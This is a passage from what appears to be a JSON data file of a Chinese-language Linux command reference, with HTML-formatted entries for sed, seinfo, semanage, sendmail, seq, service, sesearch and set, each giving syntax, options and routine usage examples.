id=\"删除操作：d命令\">删除操作：d命令</h3>\n<p>删除空白行：</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-string\">'/^$/d'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>删除文件的第2行：</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-string\">'2d'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>删除文件的第2行到末尾所有行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> <span class=\"hljs-string\">'2,<span class=\"hljs-variable\">$d</span>'</span> file\n</code></pre>\n<p>删除文件最后一行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> <span class=\"hljs-string\">'<span class=\"hljs-variable\">$d</span>'</span> file\n</code></pre>\n<p>删除文件中所有开头是test的行：</p>\n<pre><code class=\"language-shell\">sed '/^<span class=\"hljs-keyword\">test</span>/'d <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"已匹配字符串标记\">已匹配字符串标记&amp;</h3>\n<p>正则表达式 \\w+ 匹配每一个单词，使用 [&amp;] 替换它，&amp; 对应于之前所匹配到的单词：</p>\n<pre><code class=\"language-shell\">echo this <span class=\"hljs-keyword\">is</span> a test line | sed 's/\\w\\+/<span class=\"hljs-comment\">[&amp;]</span>/g'\n<span class=\"hljs-comment\">[this]</span> <span class=\"hljs-comment\">[is]</span> <span class=\"hljs-comment\">[a]</span> <span class=\"hljs-comment\">[test]</span> <span class=\"hljs-comment\">[line]</span>\n</code></pre>\n<p>所有以192.168.0.1开头的行都会被替换成它自已加localhost：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> 's/^<span class=\"hljs-number\">192.168.0.1</span>/&amp;localhost/' file\n<span class=\"hljs-attribute\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">1</span>localhost\n</code></pre>\n<h3 id=\"子串匹配标记1\">子串匹配标记\\1</h3>\n<p>匹配给定样式的其中一部分：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-keyword\">this</span> <span class=\"hljs-keyword\">is</span> digit <span class=\"hljs-number\">7</span> <span class=\"hljs-keyword\">in</span> a number | sed <span class=\"hljs-string\">'s/digit \\([0-9]\\)/\\1/'</span>\n<span class=\"hljs-keyword\">this</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">7</span> <span class=\"hljs-keyword\">in</span> a number\n</code></pre>\n<p>命令中 digit 7，被替换成了 7。样式匹配到的子串是 7，(..) 用于匹配子串，对于匹配到的第一个子串就标记为  <strong>\\1</strong> ，依此类推匹配到的第二个结果就是  <strong>\\2</strong> ，例如：</p>\n<pre><code class=\"language-shell\">echo aaa BBB | sed 's/<span class=\"hljs-symbol\">\\(</span>[a-z]\\+<span class=\"hljs-symbol\">\\)</span> <span class=\"hljs-symbol\">\\(</span>[A-Z]\\+<span class=\"hljs-symbol\">\\)</span>/\\2 \\1/'\nBBB aaa\n</code></pre>\n<p>love被标记为1，所有loveable会被替换成lovers，并打印出来：</p>\n<pre><code class=\"language-shell\">sed -n <span class=\"hljs-string\">'s/\\(love\\)able/\\1rs/p'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"组合多个表达式\">组合多个表达式</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> <span class=\"hljs-string\">'表达式'</span> | sed <span class=\"hljs-string\">'表达式'</span>\n\n等价于：\n\nsed <span class=\"hljs-string\">'表达式; 表达式'</span>\n</code></pre>\n<h3 id=\"引用\">引用</h3>\n<p>sed表达式可以使用单引号来引用，但是如果表达式内部包含变量字符串，就需要使用双引号。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">test</span>=hello\n<span class=\"hljs-built_in\">echo</span> hello WORLD | sed <span class=\"hljs-string\">\"s/<span class=\"hljs-variable\">$test</span>/HELLO\"</span>\nHELLO WORLD\n</code></pre>\n<h3 id=\"选定行的范围：（逗号）\">选定行的范围：,（逗号）</h3>\n<p>所有在模板test和check所确定的范围内的行都被打印：</p>\n<pre><code class=\"language-shell\">sed -n '/<span class=\"hljs-keyword\">test</span>/,/check/p' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>打印从第5行开始到第一个包含以test开始的行之间的所有行：</p>\n<pre><code class=\"language-shell\">sed -n '<span class=\"hljs-number\">5</span>,/^<span class=\"hljs-keyword\">test</span>/p' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>对于模板test和west之间的行，每行的末尾用字符串aaa bbb替换：</p>\n<pre><code class=\"language-shell\">sed '<span class=\"hljs-string\">/test/</span>,<span class=\"hljs-string\">/west/s/</span>$<span class=\"hljs-string\">/aaa</span> bbb/' file\n</code></pre>\n<h3 id=\"多点编辑：e命令\">多点编辑：e命令</h3>\n<p>-e选项允许在同一行里执行多条命令：</p>\n<pre><code class=\"language-shell\">sed -e <span class=\"hljs-string\">'1,5d'</span> -e <span class=\"hljs-string\">'s/test/check/'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>上面sed表达式的第一条命令删除1至5行，第二条命令用check替换test。命令的执行顺序对结果有影响。如果两个命令都是替换命令，那么第一个替换命令将影响第二个替换命令的结果。</p>\n<p>和 -e 等价的命令是 --expression：</p>\n<pre><code class=\"language-shell\">sed --<span class=\"hljs-keyword\">expression</span>=<span class=\"hljs-string\">'s/test/check/'</span> --<span class=\"hljs-keyword\">expression</span>=<span class=\"hljs-string\">'/love/d'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"从文件读入：r命令\">从文件读入：r命令</h3>\n<p>file里的内容被读进来，显示在与test匹配的行后面，如果匹配多行，则file的内容将显示在所有匹配行的下面：</p>\n<pre><code class=\"language-shell\">sed '/<span class=\"hljs-keyword\">test</span>/r <span class=\"hljs-keyword\">file</span>' filename\n</code></pre>\n<h3 id=\"写入文件：w命令\">写入文件：w命令</h3>\n<p>在example中所有包含test的行都被写入file里：</p>\n<pre><code class=\"language-shell\">sed -n '/<span class=\"hljs-keyword\">test</span>/w <span class=\"hljs-keyword\">file</span>' example\n</code></pre>\n<h3 id=\"追加（行下）：a命令\">追加（行下）：a\\命令</h3>\n<p>将 this is a test line 追加到 以test 开头的行后面：</p>\n<pre><code class=\"language-shell\">sed '/^<span class=\"hljs-keyword\">test</span>/a\\this is a <span class=\"hljs-keyword\">test</span> <span class=\"hljs-keyword\">line</span>' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>在 test.conf 文件第2行之后插入 this is a test line：</p>\n<pre><code class=\"language-shell\">sed -i '2a\\this is a <span class=\"hljs-keyword\">test</span> <span class=\"hljs-keyword\">line</span>' <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">conf</span>\n</code></pre>\n<h3 id=\"插入（行上）：i命令\">插入（行上）：i\\命令</h3>\n<p>将 this is a test line 追加到以test开头的行前面：</p>\n<pre><code class=\"language-shell\">sed '/^<span class=\"hljs-keyword\">test</span>/i\\this is a <span class=\"hljs-keyword\">test</span> <span class=\"hljs-keyword\">line</span>' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>在test.conf文件第5行之前插入this is a test line：</p>\n<pre><code class=\"language-shell\">sed -i '5i\\this is a <span class=\"hljs-keyword\">test</span> <span class=\"hljs-keyword\">line</span>' <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">conf</span>\n</code></pre>\n<h3 id=\"下一个：n命令\">下一个：n命令</h3>\n<p>如果test被匹配，则移动到匹配行的下一行，替换这一行的aa，变为bb，并打印该行，然后继续：</p>\n<pre><code class=\"language-shell\">sed '/<span class=\"hljs-keyword\">test</span>/{ n; s/aa/bb/; }' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"变形：y命令\">变形：y命令</h3>\n<p>把1~10行内所有abcde转变为大写，注意，正则表达式元字符不能使用这个命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> '<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>y/abcde/ABCDE/' file\n</code></pre>\n<h3 id=\"退出：q命令\">退出：q命令</h3>\n<p>打印完第10行后，退出sed</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-string\">'10q'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"保持和获取：h命令和g命令\">保持和获取：h命令和G命令</h3>\n<p>在sed处理文件的时候，每一行都被保存在一个叫模式空间的临时缓冲区中，除非行被删除或者输出被取消，否则所有被处理的行都将 打印在屏幕上。接着模式空间被清空，并存入新的一行等待处理。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> -e <span class=\"hljs-string\">'/test/h'</span> -e <span class=\"hljs-string\">'<span class=\"hljs-variable\">$G</span>'</span> file\n</code></pre>\n<p>在这个例子里，匹配test的行被找到后，将存入模式空间，h命令将其复制并存入一个称为保持缓存区的特殊缓冲区内。第二条语句的意思是，当到达最后一行后，G命令取出保持缓冲区的行，然后把它放回模式空间中，且追加到现在已经存在于模式空间中的行的末尾。在这个例子中就是追加到最后一行。简单来说，任何包含test的行都被复制并追加到该文件的末尾。</p>\n<h3 id=\"保持和互换：h命令和x命令\">保持和互换：h命令和x命令</h3>\n<p>互换模式空间和保持缓冲区的内容。也就是把包含test与check的行互换：</p>\n<pre><code class=\"language-shell\">sed -e <span class=\"hljs-string\">'/test/h'</span> -e <span class=\"hljs-string\">'/check/x'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"脚本scriptfile\">脚本scriptfile</h3>\n<p>sed脚本是一个sed的命令清单，启动Sed时以-f选项引导脚本文件名。Sed对于脚本中输入的命令非常挑剔，在命令的末尾不能有任何空白或文本，如果在一行中有多个命令，要用分号分隔。以#开头的行为注释行，且不能跨行。</p>\n<pre><code class=\"language-shell\">sed [<span class=\"hljs-keyword\">options</span>] -f scriptfile <span class=\"hljs-keyword\">file</span>(s)\n</code></pre>\n<h3 id=\"打印奇数行或偶数行\">打印奇数行或偶数行</h3>\n<p>方法1：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> -n <span class=\"hljs-string\">'p;n'</span> test.txt  <span class=\"hljs-comment\">#奇数行</span>\nsed -n <span class=\"hljs-string\">'n;p'</span> test.txt  <span class=\"hljs-comment\">#偶数行</span>\n</code></pre>\n<p>方法2：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sed</span> -n <span class=\"hljs-string\">'1~2p'</span> test.txt  <span class=\"hljs-comment\">#奇数行</span>\nsed -n <span class=\"hljs-string\">'2~2p'</span> test.txt  <span class=\"hljs-comment\">#偶数行</span>\n</code></pre>\n<h3 id=\"打印匹配字符串的下一行\">打印匹配字符串的下一行</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -A <span class=\"hljs-number\">1</span> SCC URFILE\nsed -n <span class=\"hljs-string\">'/SCC/{n;p}'</span> URFILE\nawk <span class=\"hljs-string\">'/SCC/{getline; print}'</span> URFILE\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "seinfo",
        "des": "查询SELinux的策略提供多少相关规则",
        "body": "<h1 id=\"seinfo\">seinfo</h1>\n<p>查询SELinux的策略提供多少相关规则</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>seinfo命令</strong> 是用来查询SELinux的策略提供多少相关规则，一个主体进程能否读取到目标文件资源的重点是在于SELinux的策略以及策略内的各项规则，然后再通过该规则的定义去处理各项目标文件的安全上下文，尤其是“类型”部分。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">seinfo（选项）\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：列出SELinux的状态、规则布尔值、身份识别、角色、类型等所有信息。</span>\n<span class=\"hljs-deletion\">-t：列出SELinux所有类型(type)的种类。</span>\n<span class=\"hljs-deletion\">-r：列出SELinux所有角色(role)的种类。</span>\n<span class=\"hljs-deletion\">-u：列出SELinux所有身份识别(user)的种类。</span>\n<span class=\"hljs-deletion\">-b：列出所有规则的种类（布尔值）。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>列出与httpd有关的规则：</p>\n<pre><code class=\"language-shell\">seinfo -b <span class=\"hljs-string\">| grep httpd</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "semanage",
        "des": "默认目录的安全上下文查询与修改",
        "body": "<h1 id=\"semanage\">semanage</h1>\n<p>默认目录的安全上下文查询与修改</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>semanage命令</strong> 是用来查询与修改SELinux默认目录的安全上下文。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">semanage {login|<span class=\"hljs-type\">user</span>|<span class=\"hljs-type\">port</span>|<span class=\"hljs-type\">interface</span>|<span class=\"hljs-type\">fcontext</span>|<span class=\"hljs-type\">translation</span>} -l\nsemanage fcontext -{a|<span class=\"hljs-type\">d</span>|<span class=\"hljs-type\">m</span>} [-frst] file_spec\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：查询。</span>\nfcontext：主要用在安全上下文方面。\n<span class=\"hljs-deletion\">-a：增加，你可以增加一些目录的默认安全上下文类型设置。</span>\n<span class=\"hljs-deletion\">-m：修改。</span>\n<span class=\"hljs-deletion\">-d：删除。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>查询一下<code>/var/www/html</code>的默认安全性本文的设置：</p>\n<pre><code class=\"language-shell\">semanage fcontext <span class=\"hljs-params\">-l</span>\nSELinux fcontext    <span class=\"hljs-keyword\">type</span>          Context\n<span class=\"hljs-params\">...</span>.(前面省略)<span class=\"hljs-params\">...</span>.\n/<span class=\"hljs-built_in\">var</span>/www(/.*)?      <span class=\"hljs-literal\">all</span> files     system_u:object_r:httpd_sys_content_t:s0\n<span class=\"hljs-params\">...</span>.(後面省略)<span class=\"hljs-params\">...</span>.\n</code></pre>\n<p>如上面例子所示，我们可以查询的到每个目录的安全性本文！而目录的设定可以使用正则表达式去指定一个范围。那么如果我们想要增加某些自定义目录的安全性本文呢？举例来说，我想要色设置<code>/srv/samba</code>成为 <code>public_content_t</code>的类型时，应该如何设置呢？</p>\n<p>用semanage命令设置<code>/srv/samba</code>目录的默认安全性本文为<code>public_content_t</code>：</p>\n<pre><code class=\"language-shell\">mkdir <span class=\"hljs-regexp\">/srv/</span>samba\nll -Zd <span class=\"hljs-regexp\">/srv/</span>samba\ndrwxr-xr-x  root root root:object_r:var_t    <span class=\"hljs-regexp\">/srv/</span>samba\n</code></pre>\n<p>如上所示，默认的情况应该是<code>var_t</code>这个咚咚的！</p>\n<pre><code class=\"language-shell\">semanage fcontext -l | <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">'/srv'</span>\n<span class=\"hljs-regexp\">/srv/</span>.*                     all files   system_u:object_r:var_t:s0\n<span class=\"hljs-regexp\">/srv/</span>([^<span class=\"hljs-regexp\">/]*/</span>)?ftp(/.*)?     all files   system_u:object_r:public_content_t:s0\n<span class=\"hljs-regexp\">/srv/</span>([^<span class=\"hljs-regexp\">/]*/</span>)?www(/.*)?     all files   system_u:object_r:httpd_sys_content_t:s0\n<span class=\"hljs-regexp\">/srv/</span>([^<span class=\"hljs-regexp\">/]*/</span>)?rsync(/.*)?   all files   system_u:object_r:public_content_t:s0\n<span class=\"hljs-regexp\">/srv/g</span>allery2(/.*)?         all files   system_u:object_r:httpd_sys_content_t:s0\n<span class=\"hljs-regexp\">/srv                        directory   system_u:object_r:var_t:s0   /</span><span class=\"hljs-regexp\">/看这里！</span>\n</code></pre>\n<p>上面则是默认的<code>/srv</code>底下的安全性本文资料，不过，并没有指定到<code>/srv/samba</code>。</p>\n<pre><code class=\"language-shell\">semanage fcontext -<span class=\"hljs-keyword\">a</span> -t public_content_t <span class=\"hljs-string\">\"/srv/samba(/.*)?\"</span>\nsemanage fcontext -<span class=\"hljs-keyword\">l</span> | <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">'/srv/samba'</span>\n/srv/samba(/.*)?            <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">files</span>   system_u:object_r:public_content_<span class=\"hljs-variable\">t:s0</span>\n</code></pre>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/etc/</span>selinux<span class=\"hljs-regexp\">/targeted/</span>contexts<span class=\"hljs-regexp\">/files/</span>file_contexts.local\n<span class=\"hljs-comment\"># This file is auto-generated by libsemanage</span>\n<span class=\"hljs-comment\"># Please use the semanage command to make changes</span>\n<span class=\"hljs-regexp\">/srv/</span>samba(/.*)?    system_u:object_r:public_content_t:s0  <span class=\"hljs-comment\">#写入这个档案</span>\n</code></pre>\n<pre><code class=\"language-shell\">restorecon -Rv <span class=\"hljs-regexp\">/srv/</span>samba* <span class=\"hljs-comment\">#尝试恢复默认值</span>\nll -Zd <span class=\"hljs-regexp\">/srv/</span>samba\ndrwxr-xr-x  root root system_u:object_r:public_content_t <span class=\"hljs-regexp\">/srv/</span>samba/  <span class=\"hljs-comment\">#有默认值，以后用restorecon命令来修改比较简单！</span>\n</code></pre>\n<p>semanage命令的功能很多，这里主要用到的仅有fcontext这个选项的用法而已。如上所示，你可以使用semanage来查询所有的目录默认值，也能够使用它来增加默认值的设置！</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sendmail",
        "des": "著名电子邮件服务器",
        "body": "<h1 id=\"sendmail\">sendmail</h1>\n<p>著名电子邮件服务器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sendmail命令</strong> 是一款著名的电子邮件传送代理程序，也就是平常说的电子邮件服务器，它基于标准的简单邮件传输协议（SMTP）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sendmail</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-bd：以守护进程方式运行指令；</span>\n<span class=\"hljs-deletion\">-bD：以前台运行方式运行；</span>\n<span class=\"hljs-deletion\">-bi：初始化别名数据库；</span>\n<span class=\"hljs-deletion\">-bm：以常规发送电子邮件；</span>\n<span class=\"hljs-deletion\">-bp：显示邮件的发送队列；</span>\n<span class=\"hljs-deletion\">-C：指定配置文件；</span>\n<span class=\"hljs-deletion\">-D：将调试的输出信息保存到日志文件，而不显示在标准输出设备上；</span>\n<span class=\"hljs-deletion\">-F：指定邮件发送者全名；</span>\n<span class=\"hljs-deletion\">-n：禁止使用邮件别名功能；</span>\n<span class=\"hljs-deletion\">-f：指定发件人的名字；</span>\n<span class=\"hljs-deletion\">-q：设置处理邮件队列中邮件的时间间隔。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "seq",
        "des": "以指定增量从首数开始打印数字到尾数",
        "body": "<h1 id=\"seq\">seq</h1>\n<p>以指定增量从首数开始打印数字到尾数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>seq命令</strong> 用于产生从某个数到另外一个数之间的所有整数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">se<span class=\"hljs-string\">q [选项]</span>... 尾数\nse<span class=\"hljs-string\">q [选项]</span>... 首数 尾数\nse<span class=\"hljs-string\">q [选项]</span>... 首数 增量 尾数\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-f, <span class=\"hljs-attribute\">--format</span>=格式        使用printf 样式的浮点格式\n-s, <span class=\"hljs-attribute\">--separator</span>=字符串   使用指定字符串分隔数字（默认使用：\\n）\n-w, --equal-width        在列前添加0 使得宽度相同\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>-f选项：指定格式</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#seq -f<span class=\"hljs-string\">\"%3g\"</span> 9 11</span>\n<span class=\"hljs-number\">9</span>\n<span class=\"hljs-number\">10</span>\n<span class=\"hljs-number\">11</span>\n</code></pre>\n<p><code>%</code>后面指定数字的位数 默认是<code>%g</code>，<code>%3g</code>那么数字位数不足部分是空格。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#sed -f<span class=\"hljs-string\">\"%03g\"</span> 9 11</span>\n<span class=\"hljs-meta\">#seq -f<span class=\"hljs-string\">\"str%03g\"</span> 9 11</span>\nstr009\nstr010\nstr011\n</code></pre>\n<p>这样的话数字位数不足部分是0，<code>%</code>前面制定字符串。</p>\n<p> <strong>-w选项：指定输出数字同宽</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">seq</span> -w <span class=\"hljs-number\">98</span> <span class=\"hljs-number\">101</span>\n<span class=\"hljs-attribute\">098</span>\n<span class=\"hljs-attribute\">099</span>\n<span class=\"hljs-attribute\">100</span>\n<span class=\"hljs-attribute\">101</span>\n</code></pre>\n<p>不能和<code>-f</code>一起用，输出是同宽的。</p>\n<p> <strong>-s选项：指定分隔符（默认是回车）</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">seq</span> -s<span class=\"hljs-string\">\" \"</span> -f<span class=\"hljs-string\">\"str%03g\"</span> <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">11</span>\n<span class=\"hljs-attribute\">str009</span> str010 str011\n</code></pre>\n<p>要指定<code>/t</code>做为分隔符号：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">seq</span> -s<span class=\"hljs-string\">\"`echo -e \"</span>/t<span class=\"hljs-string\">\"`\"</span> <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">11</span>\n</code></pre>\n<p>指定<code>\\n</code>作为分隔符号：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">seq</span> -s<span class=\"hljs-string\">\"`echo -e \"</span>\\n<span class=\"hljs-string\">\"`\"</span> <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">11</span>\n<span class=\"hljs-attribute\">19293949596979899910911</span>\n</code></pre>\n<p>得到的是个错误结果，不过一般也没有这个必要，它默认的就是回车作为分隔符。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "service",
        "des": "控制系统服务的实用工具",
        "body": "<h1 id=\"service\">service</h1>\n<p>控制系统服务的实用工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>service命令</strong> 是Redhat Linux兼容的发行版中用来控制系统服务的实用工具，它以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">service</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">--status-all：显示所服务的状态。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  服务名：自动要控制的服务名，即<code>/etc/init.d</code>目录下的脚本文件名；</li>\n<li>  控制命令：系统服务脚本支持的控制命令。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>当修改了主机名、ip地址等信息时，经常需要把网络重启使之生效。</p>\n<pre><code class=\"language-shell\">service network status\n配置设备：\nlo eth0\n当前的活跃设备：\nlo eth0\n\nservice network restart\n正在关闭接口 eth0：                                        <span class=\"hljs-selector-attr\">[  确定  ]</span>\n关闭环回接口：                                             <span class=\"hljs-selector-attr\">[  确定  ]</span>\n设置网络参数：                                             <span class=\"hljs-selector-attr\">[  确定  ]</span>\n弹出环回接口：                                             <span class=\"hljs-selector-attr\">[  确定  ]</span>\n弹出界面 eth0：                                            <span class=\"hljs-selector-attr\">[  确定  ]</span>\n</code></pre>\n<p>重启mysql</p>\n<pre><code class=\"language-shell\">service mysqld status\nmysqld (pid <span class=\"hljs-number\">1638</span>) 正在运行...\n\nservice mysqld restart\n停止 <span class=\"hljs-symbol\">MySQL</span>：                                               [  确定  ]\n启动 <span class=\"hljs-symbol\">MySQL</span>：                                               [  确定  ]\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sesearch",
        "des": "查询SELinux策略的规则详情",
        "body": "<h1 id=\"sesearch\">sesearch</h1>\n<p>查询SELinux策略的规则详情</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>使用seinfo命令可以查询SELinux的策略提供多少相关规则，如果查到的相关类型或者布尔值，想要知道详细规则时，使用 <strong>sesearch命令</strong> 查询。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">sesearch <span class=\"hljs-selector-attr\">[-a]</span> <span class=\"hljs-selector-attr\">[-s 主体类型]</span> <span class=\"hljs-selector-attr\">[-t 目标类型]</span> <span class=\"hljs-selector-attr\">[-b 布尔值]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a:列出该类型或布尔值的所有相关信息</span>\n<span class=\"hljs-deletion\">-t:后面还要接类型，例如 -t httpd_t</span>\n<span class=\"hljs-deletion\">-b:后面还要接布尔值的规则，例如 -b httpd_enable_ftp_server</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>找出目标文件资源类型为<code>httpd_sys_content_t</code>的有关信息：</p>\n<pre><code class=\"language-shell\">sesearch -a -t <span class=\"hljs-type\">httpd_sys_content_t</span>\n</code></pre>\n<p>找出主体进程为<code>httpd_t</code>且目标文件类型为httpd相关的所有信息：</p>\n<pre><code class=\"language-shell\">sesearch -s <span class=\"hljs-type\">httpd_t</span> -t httpd_* -a\n</code></pre>\n<p>查看布尔值<code>httpd_enable_homedirs</code>设置了多少规则</p>\n<pre><code class=\"language-shell\">sesearch -<span class=\"hljs-selector-tag\">b</span> httpd_enable_homedirs -<span class=\"hljs-selector-tag\">a</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "set",
        "des": "显示或设置shell特性及shell变量",
        "body": "<h1 id=\"set\">set</h1>\n<p>显示或设置shell特性及shell变量</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>set命令</strong> 作用主要是显示系统中已经存在的shell变量，以及设置shell变量的新变量值。使用set更改shell特性时，符号\"+\"和\"-\"的作用分别是打开和关闭指定的模式。set命令不能够定义新的shell变量。如果要定义新的变量，可以使用declare命令以<code>变量名=值</code>的格式进行定义即可。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">set</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：标示已修改的变量，以供输出至环境变量。</span>\n<span class=\"hljs-deletion\">-b：使被中止的后台程序立刻回报执行状态。</span>\n<span class=\"hljs-deletion\">-C：转向所产生的文件无法覆盖已存在的文件。</span>\n<span class=\"hljs-deletion\">-d：Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。</span>\n<span class=\"hljs-deletion\">-e：若指令传回值不等于0，则立即退出shell。</span>\n<span class=\"hljs-deletion\">-f：取消使用通配符。</span>\n<span class=\"hljs-deletion\">-h：自动记录函数的所在位置。</span>\n<span class=\"hljs-deletion\">-H Shell：可利用\"!\"加&lt;指令编号&gt;的方式来执行history中记录的指令。</span>\n<span class=\"hljs-deletion\">-k：指令所给的参数都会被视为此指令的环境变量。</span>\n<span class=\"hljs-deletion\">-l：记录for循环的变量名称。</span>\n<span class=\"hljs-deletion\">-m：使用监视模式。</span>\n<span class=\"hljs-deletion\">-n：只读取指令，而不实际执行。</span>\n<span class=\"hljs-deletion\">-p：启动优先顺序模式。</span>\n<span class=\"hljs-deletion\">-P：启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。</span>\n<span class=\"hljs-deletion\">-t：执行完随后的指令，即退出shell。</span>\n<span class=\"hljs-deletion\">-u：当执行时使用到未定义过的变量，则显示错误信息。</span>\n<span class=\"hljs-deletion\">-v：显示shell所读取的输入值。</span>\n<span class=\"hljs-deletion\">-x：执行指令后，会先显示该指令及所下的参数。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>取消某个set曾启动的参数。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用declare命令定义一个新的环境变量\"mylove\"，并且将其值设置为\"Visual C++\"，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">declare</span> mylove=<span class=\"hljs-string\">'Visual C++'</span>   <span class=\"hljs-comment\">#定义新环境变量</span>\n</code></pre>\n<p>再使用set命令将新定义的变量输出为环境变量，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">set</span> -<span 